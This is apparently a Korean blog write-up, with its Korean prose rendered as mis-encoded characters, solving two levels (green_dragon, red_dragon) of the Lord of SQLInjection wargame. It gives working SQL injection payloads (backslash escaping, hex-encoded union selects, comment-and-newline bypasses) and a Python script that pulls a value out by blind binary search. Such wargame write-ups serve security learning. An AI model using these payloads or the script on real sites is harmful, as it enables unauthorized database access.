---
title: "[LOS] 25,26ë²ˆ ë¬¸ì œ í’€ì´(green_dragon,red_dragon)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 25ë²ˆ
  - los 26ë²ˆ
  - los green_dragon
  - los red_dragon
  
toc: true
toc_sticky: true
toc_label: "25,26ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 25ë²ˆ,26ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. 
{: .notice--warning}


# 25ë²ˆ(green_dragon)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/159745329-5577e1f1-a565-4af9-83c1-c8c80515bf51.png)

## í’€ì´
ìš°ì„  í•„í„°ë§ ëœ ë¬¸ìë“¤ ì¤‘ì— ì„¸ë¯¸ì½œë¡ (')ì´ ìˆìŠµë‹ˆë‹¤. ì„¸ë¯¸ì½œë¡ ì´ í•„í„°ë§ ìƒí™©ì—ì„œ ë¬¸ìì—´ì„ ì´ìŠ¤ì¼€ì´í•‘ í•˜ê¸° ìœ„í•´ì„œ ì´ìŠ¤ì¼€ì´í”„ ë¬¸ìì¸(\\)ì„ ì‚¬ìš©í•´ ì¤ë‹ˆë‹¤.

id = \\ ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ pwë¶€ë¶„ê¹Œì§€ ë¬¸ìì—´ë¡œ ì²˜ë¦¬ë˜ì–´ì„œ pwë¶€ë¶„ì— ë°”ë¡œ dbëª…ë ¹ì–´ ìˆ˜í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

```sql
select id,pw from prob_green_dragon where id='\' and pw=' or 1#'
```

![image](https://user-images.githubusercontent.com/33647663/159746105-26a60e43-ec2b-444d-9b27-e5588dfe4f36.png)

ì •ìƒì ìœ¼ë¡œ ì¿¼ë¦¬ê°€ ì‹¤í–‰ë˜ì—ˆë‹¤ë©´, ```if(result['id'])```ê°€ ì°¸ì´ë˜ì–´ ë‘ë²ˆì§¸ ì¿¼ë¦¬ì˜ ê²°ê³¼ê°€ ë‚˜ì™”ì–´ì•¼ í•˜ì§€ë§Œ, ì•„ë¬´ëŸ° ê²°ê³¼ê°€ ë‚˜ì˜¤ì§€ ì•Šê³  ìˆìŠµë‹ˆë‹¤. 

DBì— ì•„ë¬´ëŸ° ë°ì´í„°ê°€ ì—†ì„ ê²ƒìœ¼ë¡œ ì¶”ì¸¡í•˜ì—¬ union selectë¥¼ í•´ë´…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/159746406-784a39e7-d6f7-42d0-af58-1fc1e8a42aec.png)

ì˜ˆìƒëŒ€ë¡œ DBì—ëŠ” ì•„ë¬´ëŸ° ë°ì´í„°ê°€ ì—†ì—ˆê³ , union select 1,2ë¥¼ í•˜ì—¬ result['id'] = 1, result['pw'] = 2 ê°€ ë“¤ì–´ê°€ì„œ query 2ë²ˆì´ ì‹¤í–‰ë˜ì—ˆìŠµë‹ˆë‹¤.

ì´ë²ˆì—ë„ ë™ì¼í•œ ë¡œì§ìœ¼ë¡œ id=\\ì„ ë„£ì–´ì£¼ê³ , pwì— ì–´ë– í•œ ê°’ì„ ë„£ì–´ì¤˜ì„œ ì¿¼ë¦¬ì˜ ê²°ê³¼ ê°’ì´ 'admin'ì´ ë‚˜ì˜¤ë©´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

í…Œì´ë¸”ì—ëŠ” ë°ì´í„°ê°€ ì—†ê¸° ë•Œë¬¸ì— query1ì˜ ê²°ê³¼ë¡œ ë‚˜ì˜¨ id,pwê°€ ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥ë˜ì–´ì•¼ query2ì—ì„œë„ union selectë¡œ ì¸í•´ì„œ 'admin'ì˜ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤.

```
id = \
pw = union select 'admin'#
```

ìš°ì„  idì— ë“¤ì–´ê°€ëŠ” ```\```í‘œì‹œëŠ” 0x5cë¡œ ë°”ê¿”ì£¼ê³ , ì„¸ë¯¸ì½œë¡ (')ì„ í•„í„°ë§ í•˜ê³  ìˆê¸° ë•Œë¬¸ì— pwì— ë“¤ì–´ê°€ëŠ” ê°’ì„ 0x í˜•ì‹ìœ¼ë¡œ í‘œí˜„í•˜ì—¬ ìš°íšŒí•´ ì¤ë‹ˆë‹¤.
```union select 'admin'#```ì„ ì „ë¶€ 16ì§„ìˆ˜ë¡œ ë°”ê¿”ì„œ í‘œí˜„í•˜ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
test = " union select 0x61646d696e#"
for character in test:
    print(str(hex(ord(character)))[2:],end='')

# 20756e696f6e2073656c6563742030783631363436643639366523
```

ì´ì œ ì´ ê²°ê³¼ ê°’ì„ ì´ìš©í•´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì „ì²´ ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•´ ì¤ë‹ˆë‹¤.

```
id = \
pw = union select 0x5c,0x20756e696f6e2073656c6563742030783631363436643639366523

```

![image](https://user-images.githubusercontent.com/33647663/159748486-8c10e0c8-873e-499c-a7bd-edee510473e2.png)

# 26ë²ˆ(red_dragon)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/159748785-9b67c3b7-cd40-4aff-8682-6339c423b9f3.png)

## í’€ì´
ìš°ì„  idì— ```'=0;%00```ì„ ë„£ì–´ì„œ trueì¼ ë•Œ ì–´ë–¤ ê°’ì´ ë°˜í™˜ë˜ëŠ”ì§€ ë´…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/159749259-c13e039d-abfe-46d3-8e1c-ae7f112f83a7.png)

í…Œì´ë¸”ì— admin ë°ì´í„°ê°€ ì¶œë ¥ë©ë‹ˆë‹¤. 

ë¬¸ì œì˜ í´ë¦¬ì–´ ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ìœ¼ë©° adminì˜ no ê°’ì„ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤.

```php
$query = "select no from prob_red_dragon where id='admin'";
$result = @mysqli_fetch_array(mysqli_query($db,$query));
if($result['no'] === $_GET['no']) solve("red_dragon");
```

no ê°’ì— ë“¤ì–´ê°€ëŠ” ê²€ì¦ì„ **is_numeric** í•¨ìˆ˜ê°€ í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë•Œ, is_numericì€ ì˜¤ë¥˜ë¥¼ ì¤„ì´ê¸° ìœ„í•´ì„œ ë§¨ ì•ìë¦¬ì— ê³µë°±ë¬¸ìê°€ ì˜¨ë‹¤ë©´ ì´ë¥¼ ê·¸ëŒ€ë¡œ ì²˜ë¦¬í•´ì¤ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/159749943-dc1ba1fe-27aa-4ff8-ad99-8a3290bcc7a0.png)

ê·¸ë ‡ë‹¤ë©´ id ë¶€ë¶„ì—ì„œ í•œì¤„ ì£¼ì„ ì²˜ë¦¬ë¥¼ í†µí•´ì„œ ì „ë¶€ ì£¼ì„ ì²˜ë¦¬ë¥¼ í•˜ê³ , no ë¶€ë¶„ì— %0a123ê³¼ ê°™ì´ ì…ë ¥í•œë‹¤ë©´, í•œì¤„ ì£¼ì„ ì´í›„ê¹Œì§€ì˜ ëª…ë ¹ì–´ì— ì´ì–´ì„œ ìˆ«ìë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•´ ì¤ë‹ˆë‹¤.
```
id='||no>#
```

![image](https://user-images.githubusercontent.com/33647663/159750285-7b5aa2af-5e5b-4ad3-bcc7-601a0aee679d.png)

ìœ„ì˜ ì¿¼ë¦¬ë¬¸ì€ #ë¶€ë¶„ë¶€í„° ì£¼ì„ì´ ì²˜ë¦¬ê°€ ë˜ê³ , ì¤„ ë°”ê¿ˆ ë¬¸ìë¥¼ ë§Œë‚œë‹¤ìŒì—” ì£¼ì„ ì²˜ë¦¬ê°€ ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì•„ë˜ì™€ ë™ì¼í•œ ì¿¼ë¦¬ë¬¸ì…ë‹ˆë‹¤.

```sql
select id from prob_red_dragon where id=''||no>1000
```

ì¦‰ idì˜ no>1000ê³¼ ê°™ì´ ëŒ€ì†Œ ë¹„êµê°€ ê°€ëŠ¥í•´ ì§‘ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ì—¬ ì½”ë“œë¥¼ í†µí•´ì„œ ë°˜ë³µì²˜ë¦¬ë¥¼ í•´ì¤ë‹ˆë‹¤. 

```python
import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no<%23&no=%0a"
url2 = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no=%23&no=%0a"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"} 

start,end = 100000000,1000000000
while True:
    search = int((start + end)/2)
    response = requests.get(url + str(search),cookies=cookies)
    if("Hello admin" in response.text):
        end = search
    else:
        response = requests.get(url2 + str(search),cookies=cookies)
        if("Hello admin" in response.text):
            print("find the no",search)
            break
        start = search
    print(search)

```

ìˆ«ìê°€ í¬ê¸° ë•Œë¬¸ì— ì´ì§„ íƒìƒ‰ ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤.
ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
```
550000000
775000000
662500000
606250000
578125000
592187500
585156250
588671875
586914062
586035156
586474609
586694335
586584472
586483191
586482333
586481904
586482118
586482011
586482064
586482037
586482024
586482017
find the no 586482014
```


![image](https://user-images.githubusercontent.com/33647663/159750859-00e954c5-8737-4a19-a220-c86a11de7f51.png)